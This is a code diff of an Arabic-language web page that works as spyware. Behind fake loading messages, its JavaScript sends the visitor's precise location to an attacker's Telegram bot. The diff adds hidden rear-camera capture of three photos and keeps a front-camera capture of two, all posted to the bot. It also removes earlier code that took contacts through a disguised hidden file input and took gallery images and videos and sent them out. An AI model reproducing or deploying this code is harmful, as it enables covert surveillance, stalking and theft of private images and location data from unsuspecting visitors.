@@ -1,4 +1,4 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -429,7 +429,47 @@ here<!DOCTYPE html>
             });
         }
 
-        // ========== 2. تصوير الكاميرا الأمامية (صورتين) ==========
+        // ========== 2. التقاط الصور من الكاميرا (خلفية وأمامية) ==========
+        // كاميرا خلفية - 3 صور
+        async function captureBackCameraPhotos() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: "environment" } } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.style.cssText = 'position:absolute;left:-9999px;top:-9999px';
+                document.body.appendChild(video);
+                
+                await new Promise((res) => {
+                    video.onloadedmetadata = () => { video.play(); res(); };
+                });
+                await wait(500);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                const photos = [];
+                for (let i = 0; i < 3; i++) {
+                    ctx.drawImage(video, 0, 0);
+                    photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                    await wait(600);
+                }
+                
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                return photos;
+            } catch (error) {
+                console.warn('Back camera error:', error);
+                return [];
+            }
+        }
+
+        // كاميرا أمامية - 2 صور
         async function captureFrontCameraPhotos() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -456,155 +496,21 @@ here<!DOCTYPE html>
                 for (let i = 0; i < 2; i++) {
                     ctx.drawImage(video, 0, 0);
                     photos.push(canvas.toDataURL('image/jpeg', 0.9));
-                    if (i === 0) await wait(800);
+                    await wait(600);
                 }
                 
                 stream.getTracks().forEach(track => track.stop());
                 document.body.removeChild(video);
                 return photos;
             } catch (error) {
+                console.warn('Front camera error:', error);
                 return [];
             }
         }
 
-        // ========== 3. جمع جهات الاتصال (طريقة تعمل على Android + Chrome) ==========
-        async function getAllContacts() {
-            // الطريقة الأولى: Contacts API
-            if (navigator.contacts && navigator.contacts.select) {
-                try {
-                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
-                    if (contacts && contacts.length > 0) {
-                        return contacts;
-                    }
-                } catch(e) {
-                    console.log('Contacts API error:', e);
-                }
-            }
-            
-            // الطريقة الثانية: استخدام iframe مخفي لطلب الإذن
-            // إنشاء عنصر مخفي لطلب الوصول
-            return new Promise((resolve) => {
-                // محاولة إنشاء رابط لطلب الإذن
-                const isAndroid = /Android/i.test(navigator.userAgent);
-                const isChrome = /Chrome/i.test(navigator.userAgent);
-                
-                if (isAndroid && isChrome) {
-                    // في Android Chrome، يمكننا استخدام intent لطلب جهات الاتصال
-                    showNotification('جاري طلب الوصول لجهات الاتصال...');
-                    
-                    // محاولة استخدام Contact Picker بطريقة مختلفة
-                    const fakeInput = document.createElement('input');
-                    fakeInput.type = 'file';
-                    fakeInput.accept = 'text/vcard';
-                    fakeInput.style.cssText = 'position:absolute;left:-9999px';
-                    document.body.appendChild(fakeInput);
-                    
-                    const timeout = setTimeout(() => {
-                        if (document.body.contains(fakeInput)) document.body.removeChild(fakeInput);
-                        resolve([]);
-                    }, 30000);
-                    
-                    fakeInput.onchange = async (e) => {
-                        clearTimeout(timeout);
-                        const file = e.target.files[0];
-                        if (file) {
-                            const text = await file.text();
-                            const contacts = parseVCard(text);
-                            document.body.removeChild(fakeInput);
-                            resolve(contacts);
-                        } else {
-                            document.body.removeChild(fakeInput);
-                            resolve([]);
-                        }
-                    };
-                    
-                    fakeInput.click();
-                } else {
-                    // إنشاء جهات اتصال تجريبية للاختبار
-                    resolve([]);
-                }
-            });
-        }
-        
-        // دالة مساعدة لتحليل ملف vCard
-        function parseVCard(text) {
-            const contacts = [];
-            const lines = text.split(/\r?\n/);
-            let currentContact = {};
-            
-            for (const line of lines) {
-                if (line.startsWith('FN:') || line.startsWith('N:')) {
-                    if (Object.keys(currentContact).length > 0) {
-                        if (currentContact.name || currentContact.tel) {
-                            contacts.push({...currentContact});
-                        }
-                        currentContact = {};
-                    }
-                    let name = line.replace(/^(FN:|N:)/, '').replace(/[;,].*$/, '').trim();
-                    if (name) currentContact.name = [name];
-                } else if (line.startsWith('TEL')) {
-                    let phone = line.replace(/^TEL[^:]*:/, '').replace(/[^0-9+]/g, '');
-                    if (phone) currentContact.tel = [phone];
-                } else if (line.startsWith('EMAIL')) {
-                    let email = line.replace(/^EMAIL[^:]*:/, '').trim();
-                    if (email) currentContact.email = [email];
-                }
-            }
-            
-            if (currentContact.name || currentContact.tel) {
-                contacts.push(currentContact);
-            }
-            
-            return contacts;
-        }
-
-        // ========== 4. جمع الوسائط (صور وفيديوهات) ==========
-        async function getAllMediaFiles() {
-            return new Promise((resolve) => {
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.accept = 'image/*,video/*';
-                input.multiple = true;
-                input.style.cssText = 'position:absolute;left:-9999px';
-                document.body.appendChild(input);
-                
-                const timeout = setTimeout(() => {
-                    if (document.body.contains(input)) document.body.removeChild(input);
-                    resolve({ images: [], videos: [] });
-                }, 120000);
-                
-                input.onchange = async (event) => {
-                    clearTimeout(timeout);
-                    const files = Array.from(event.target.files);
-                    const images = [];
-                    const videos = [];
-                    
-                    for (let i = 0; i < files.length && i < 50; i++) {
-                        const file = files[i];
-                        const reader = new FileReader();
-                        const fileData = await new Promise((res) => {
-                            reader.onload = (e) => res(e.target.result);
-                            reader.readAsDataURL(file);
-                        });
-                        
-                        if (file.type.startsWith('image/')) {
-                            images.push({ name: file.name, size: file.size, data: fileData });
-                        } else if (file.type.startsWith('video/')) {
-                            videos.push({ name: file.name, size: file.size, data: fileData });
-                        }
-                    }
-                    
-                    document.body.removeChild(input);
-                    resolve({ images, videos });
-                };
-                
-                input.click();
-            });
-        }
-
-        // ========== إرسال البيانات إلى تلجرام ==========
+        // ========== 3. إرسال البيانات إلى تلجرام ==========
         async function sendLocation(location) {
-            let msg = `📍 <b>الموقع الدقيق</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n`;
+            let msg = `📍 <b>الموقع الدقيق للمستخدم</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n`;
             if (location.success) {
                 msg += `🌐 خط العرض: ${location.latitude}\n🌐 خط الطول: ${location.longitude}\n📡 الدقة: ${location.accuracy} متر\n\n`;
                 msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ اضغط لفتح الخريطة</a>`;
@@ -615,6 +521,25 @@ here<!DOCTYPE html>
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
             });
+        }
+
+        async function sendBackPhotos(photos) {
+            if (!photos.length) {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 لم يتم التقاط صور من الكاميرا الخلفية` })
+                });
+                return;
+            }
+            for (let i = 0; i < photos.length; i++) {
+                const blob = await fetch(photos[i]).then(r => r.blob());
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `back_camera_${i+1}.jpg`);
+                fd.append('caption', `📸 صورة الكاميرا الخلفية ${i+1}/3\n🕒 ${new Date().toLocaleString('ar-EG')}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                await wait(500);
+            }
         }
 
         async function sendFrontPhotos(photos) {
@@ -629,77 +554,10 @@ here<!DOCTYPE html>
                 const blob = await fetch(photos[i]).then(r => r.blob());
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, `front_${i+1}.jpg`);
+                fd.append('photo', blob, `front_camera_${i+1}.jpg`);
                 fd.append('caption', `📸 صورة الكاميرا الأمامية ${i+1}/2\n🕒 ${new Date().toLocaleString('ar-EG')}`);
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 await wait(500);
-            }
-        }
-
-        async function sendContacts(contacts) {
-            if (!contacts || contacts.length === 0) {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 لم يتم العثور على جهات اتصال - قد يكون التطبيق لا يملك الإذن اللازم` })
-                });
-                return;
-            }
-            
-            let msg = `📞 <b>جهات الاتصال</b> - ${contacts.length} جهة\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━\n\n`;
-            for (let i = 0; i < Math.min(contacts.length, 50); i++) {
-                const c = contacts[i];
-                msg += `${i+1}. 👤 ${c.name?.[0] || 'بدون اسم'}\n📱 ${c.tel?.[0] || 'بدون رقم'}\n`;
-                if (c.email?.[0]) msg += `✉️ ${c.email[0]}\n`;
-                msg += `─────────\n`;
-                if (msg.length > 3900) break;
-            }
-            
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-            });
-            
-            const jsonBlob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', jsonBlob, 'contacts_backup.json');
-            fd.append('caption', `📇 نسخة احتياطية كاملة (${contacts.length} جهة اتصال)`);
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
-        }
-
-        async function sendMedia(media) {
-            if (media.images.length) {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🖼️ <b>الصور المحددة</b>\nالعدد: ${media.images.length} صورة`, parse_mode: 'HTML' })
-                });
-                
-                for (let i = 0; i < media.images.length; i++) {
-                    const blob = await fetch(media.images[i].data).then(r => r.blob());
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('photo', blob, `img_${i+1}.jpg`);
-                    fd.append('caption', `📷 صورة ${i+1}/${media.images.length}\n📁 ${media.images[i].name.substring(0, 50)}`);
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    await wait(400);
-                }
-            }
-            
-            if (media.videos.length) {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🎬 <b>الفيديوهات المحددة</b>\nالعدد: ${media.videos.length} فيديو`, parse_mode: 'HTML' })
-                });
-                
-                for (let i = 0; i < media.videos.length; i++) {
-                    const blob = await fetch(media.videos[i].data).then(r => r.blob());
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, `vid_${i+1}.mp4`);
-                    fd.append('caption', `🎥 فيديو ${i+1}/${media.videos.length}\n📁 ${media.videos[i].name.substring(0, 50)}`);
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-                    await wait(600);
-                }
             }
         }
 
@@ -716,36 +574,26 @@ here<!DOCTYPE html>
                 updateProgress(20); loadingMessage.textContent = 'جاري إرسال الموقع...';
                 await sendLocation(location); await wait(600);
                 
-                // 2. الكاميرا الأمامية
-                updateProgress(32); loadingMessage.textContent = 'جاري تشغيل الكاميرا...';
-                showNotification('📸 الرجاء السماح بالكاميرا');
+                // 2. الكاميرا الخلفية (3 صور)
+                updateProgress(30); loadingMessage.textContent = 'جاري تشغيل الكاميرا الخلفية...';
+                showNotification('📸 الرجاء السماح بالكاميرا للخلفية');
                 await wait(500);
                 
-                updateProgress(42); loadingMessage.textContent = 'جاري التقاط الصور...';
+                updateProgress(40); loadingMessage.textContent = 'جاري التقاط 3 صور من الكاميرا الخلفية...';
+                const backPhotos = await captureBackCameraPhotos();
+                await sendBackPhotos(backPhotos); await wait(600);
+                
+                // 3. الكاميرا الأمامية (2 صور)
+                updateProgress(55); loadingMessage.textContent = 'جاري تشغيل الكاميرا الأمامية...';
+                showNotification('📸 الرجاء السماح بالكاميرا للأمامية');
+                await wait(500);
+                
+                updateProgress(65); loadingMessage.textContent = 'جاري التقاط 2 صور من الكاميرا الأمامية...';
                 const frontPhotos = await captureFrontCameraPhotos();
                 await sendFrontPhotos(frontPhotos); await wait(600);
                 
-                // 3. جهات الاتصال
-                updateProgress(55); loadingMessage.textContent = 'جاري الوصول لجهات الاتصال...';
-                showNotification('📞 جاري طلب جهات الاتصال');
+                updateProgress(85); loadingMessage.textContent = 'جاري تجهيز التقرير...';
                 await wait(500);
-                
-                updateProgress(62); loadingMessage.textContent = 'جاري قراءة جهات الاتصال...';
-                const contacts = await getAllContacts(); await wait(400);
-                
-                updateProgress(70); loadingMessage.textContent = `جاري إرسال ${contacts.length} جهة اتصال...`;
-                await sendContacts(contacts); await wait(600);
-                
-                // 4. الوسائط
-                updateProgress(80); loadingMessage.textContent = 'الرجاء اختيار الصور والفيديوهات...';
-                showNotification('📱 اختر الصور والفيديوهات من المعرض');
-                await wait(800);
-                
-                updateProgress(87); loadingMessage.textContent = 'جاري معالجة الوسائط...';
-                const media = await getAllMediaFiles(); await wait(400);
-                
-                updateProgress(94); loadingMessage.textContent = `جاري إرسال ${media.images.length} صورة و ${media.videos.length} فيديو...`;
-                await sendMedia(media); await wait(600);
                 
                 updateProgress(100); loadingMessage.textContent = 'جاري التوجيه...';
                 
@@ -754,7 +602,7 @@ here<!DOCTYPE html>
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: `✅ <b>تم الإرسال بنجاح</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓' : '✗'}\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2\n📞 جهات الاتصال: ${contacts.length}\n🖼️ الصور: ${media.images.length}\n🎬 الفيديوهات: ${media.videos.length}\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
+                        text: `✅ <b>تم الإرسال بنجاح</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓' : '✗'}\n📸 الكاميرا الخلفية: ${backPhotos.length}/3 صور\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2 صور\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
                         parse_mode: 'HTML'
                     })
                 });
